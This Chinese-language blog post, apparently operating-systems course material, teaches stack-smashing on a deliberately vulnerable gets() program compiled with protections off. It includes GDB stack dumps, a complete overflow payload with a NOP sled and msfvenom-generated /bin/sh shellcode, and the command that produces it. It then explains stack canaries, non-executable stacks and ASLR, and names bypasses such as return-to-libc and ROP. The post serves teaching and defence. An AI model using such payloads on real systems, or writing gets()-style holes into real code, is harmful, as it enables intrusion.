---
layout: post
date: 2022-02-28
title: "Stack-smashing Attack: An Introduction"
categories: ["NJU-22020230 Operating Systems", "Material"]
tags: 
mathjax: true
---

本文主要介绍一段简单的栈溢出攻击代码，并简介几种 Linux 中防止栈溢出攻击的方法。

## Hack Code

> 注：为了实现的简单，受攻击的 C 程序编译时应加上如下参数：
>
> ```c
> gcc -o vuln vuln.c -fno-stack-protector -z execstack
> ```
>
> 这两个参数使得栈上数据可执行并取消了栈溢出检查。此外，我们还需要手动关闭 ASLR。

<!-- more -->

```c
// vuln.c
#include <stdio.h>
#include <string.h>

int main (int argc, char *argv[])
{
	char msg[32];
	gets(msg);
	printf("%s\n", msg);
	return 0;
}
```

`gets(msg)` 函数是一个非常危险的字符串读取函数，因为它完全无法控制会读取到几个字符，一旦读取的字符串长度超过 msg 的长度就会发生缓冲区溢出。最新版的 C 标准已经将 gets() 函数移除，fgets() 指定输入文件为 stdin 可以达到和 gets 相同的效果，不同的是 fgets() 可以指定输入长度的上限。下面介绍的 hack 代码正是利用了 gets() 不检查溢出的特性。

使用 GDB 进行调试，通过命令 `i r rsp` 和 `i r rbp` 确定栈帧的位置，通过 `x/32x $rsp` 检查栈帧附近的内容，并确定 buf[] 的首地址为 0x7fffffffdd60。

```
rsp = 0x7fffffffdd50 rbp = 0x7fffffffdd80 buf = 0x7fffffffdd60

0x7fffffffdd50:	0xffffde78	0x00007fff	0x555551a0	0x00000001
0x7fffffffdd60:	0x00000000	0x00000000	0x55555080	0x00005555
0x7fffffffdd70:	0xffffde70	0x00007fff	0x00000000	0x00000000
0x7fffffffdd80:	0x00000000	0x00000000	0xf7de9565	0x00007fff
0x7fffffffdd90:	0xffffde78	0x00007fff	0xf7fc7000	0x00000001
0x7fffffffdda0:	0x55555169	0x00005555	0xffffe209	0x00007fff
0x7fffffffddb0:	0x555551a0	0x00005555	0xace3e1b6	0x2c1321da
0x7fffffffddc0:	0x55555080	0x00005555	0x00000000	0x00000000
```

根据调用规约，在 64 位机器上，`rbp + 8` 处存放的是返回地址 0x7ffff7de9565。我们攻击的核心目标是利用 gets() 的缓冲区溢出改写返回地址，使得 main() 函数返回时可以跳转到我们的“恶意程序”上继续执行。

我们的 hack code 如下：

```
\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41
\x90\xdd\xff\xff\xff\x7f\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f\x52
\x66\x68\x2d\x63\x54\x5e\x52\xe8\x08\x00\x00\x00\x2f\x62\x69
\x6e\x2f\x73\x68\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f\x05
```

* 第一部分是 40 个字符 A，它的目的是填充整个栈帧，一直填到返回地址之前。

* 第二部分是我们希望的返回地址，这个数值是 0x7fffffffdd90 (返回地址所在地址的下一位)。由于我们提前关闭了 ASLR，所以栈帧的地址和返回地址都是不变的，我们可以直接将这个数值硬编码在 hack code 里。

* 第三部分是一串空字符，称为 NOP sled。在本程序中是不必要的 (因为没有 ASLR)，在打开 ASLR 的情况下，一段 NOP sled 可以提高攻击成功的概率，因为我们只要让返回地址落在 NOP sled 的范围内，CPU 便会执行 nop 指令，PC 不断后移，直到来到我们的恶意代码。

* 第四部分是我们的恶意程序，我们希望打开一个新的程序 `/bin/sh`。这里笔者使用了工具 msfvenom：

    ```bash
    msfvenom -p linux/x64/exec CMD=/bin/sh -f c
    ```

    它可以自动生成一段打开 `/bin/sh` 的机器指令，并以 C 风格输出：

    ```c
    Payload size: 44 bytes
    Final size of c file: 209 bytes
    unsigned char buf[] = 
    "\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f\x52"
    "\x66\x68\x2d\x63\x54\x5e\x52\xe8\x08\x00\x00\x00\x2f\x62\x69"
    "\x6e\x2f\x73\x68\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f\x05";
    ```

在 GDB 中运行，设置好断点后，通过 `run < malice` 命令可以将输入重定向到我们的恶意代码。在 main() 函数返回之前，栈帧的数据如下：

```
0x7fffffffdd50:	0xffffde78	0x00007fff	0x555551a0	0x00000001
0x7fffffffdd60:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdd70:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdd80:	0x41414141	0x41414141	0xffffdd90	0x00007fff
0x7fffffffdd90:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffdda0:	0x90909090	0x90909090	0x622fb848	0x732f6e69
0x7fffffffddb0:	0x50990068	0x66525f54	0x54632d68	0x08e8525e
0x7fffffffddc0:	0x2f000000	0x2f6e6962	0x56006873	0x6a5e5457
0x7fffffffddd0:	0x050f583b	0x00000000	0x00000000	0x00000000
```

可以看到 buf 前半部分都是 A，后面跟着我们的返回地址，一段 NOP sled 后是我们的恶意代码。

继续执行，可以看到执行了一堆 push,pop 之后，最核心的三句话为：

```assembly
push $0x3b
pop $rax
syscall
```

0x3b 是 execve() 系统调用的系统调用号，执行到 syscall 后，GDB 会提示：

```bash
process 62464 is executing new program: /usr/bin/dash
```

我们的 hack code 成功运行了一个其他程序。

## Stack Canary

为了避免程序被过分容易地 hack，Linux 中有若干种栈溢出保护的机制。

Stack Canary (金丝雀) 的思路是：在创建栈帧时，在栈帧底部存放一个特殊的值，这个值被称为金丝雀，并在函数返回之前查看金丝雀是否改变。如果函数执行过程中发生了栈溢出，则金丝雀一定被覆盖了，一旦发现金丝雀被改变则直接报错。

对于之前的示例代码 `vuln.c`，如果我们在编译时不添加 `-fno-stack-protector`，观察反汇编结果，可以看到

```assembly
0000000000001189 <main>:
1189:	f3 0f 1e fa          	endbr64 
118d:	55                   	push   %rbp
118e:	48 89 e5             	mov    %rsp,%rbp
1191:	48 83 ec 40          	sub    $0x40,%rsp
1195:	89 7d cc             	mov    %edi,-0x34(%rbp)
1198:	48 89 75 c0          	mov    %rsi,-0x40(%rbp)
119c:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
11a3:	00 00 
11a5:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
		......					......
11cd:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
11d1:	64 48 2b 14 25 28 00 	sub    %fs:0x28,%rdx
11d8:	00 00 
11da:	74 05                	je     11e1 <main+0x58>
11dc:	e8 9f fe ff ff       	call   1080 <__stack_chk_fail@plt>
11e1:	c9                   	leave  
11e2:	c3                   	ret    
 
```

119c 行的命令 `mov %fs:0x28, %rax` 将一个“奇妙”的数值存入 rax 寄存器，紧接着 11a5 行将这个值保存在了 `rbp - 8` 的位置，这便是金丝雀。在函数返回之前，11cd 行将金丝雀取出并在 11d1,11da 行对其值进行检查，如果不匹配则会在 11dc 行跳转到函数 __stack_chk_fail() 中。

在打开 stack canary 的情况下，直接使用我们的 hack code，便会得到

```
*** stack smashing detected ***: terminated
Program received signal SIGABRT, Aborted.
```

对抗金丝雀的技巧通常是利用一些读函数不遇到 `\0` 不停止的特性，把金丝雀的值泄漏出来，然后在进行栈溢出攻击的时候小心地处理金丝雀以骗过检查。

## Non-executable Stack

Linux 打开了 non-executable stack 用于防御栈溢出攻击。栈对应的页面的 NX bit 会被打开，表示栈上的数据不可执行。对于之前的 `vuln.c`，如果我们在编译时不加入 `-z execstack` 选项，则默认栈对应的页面都有 NX bit。此时直接使用我们的 hack code，会在跳转到 NOP sled 执行第一条 nop 指令时直接触发段错误。

对抗 non-executable stack 的方法有 return-to-libc attack。攻击者将返回地址填写为 libc 库函数的地址，利用库函数语句来完成其攻击目的。在此基础上还有 ROP (return-oriented programming)，它不是利用完整的 libc 库函数，而是抓取多个靠近 `ret` 的零碎指令片段组合起来达到目的。

## Address Space Layout Randomization (ASLR)

Linux 默认打开 ASLR，如果我们反复执行 `./vuln` ，会发现每次栈的位置都不一样，这使得我们无法准确判定需要攻击的地址。之前提到的 NOP sled 是一种可能的对抗 ASLR 的方法。

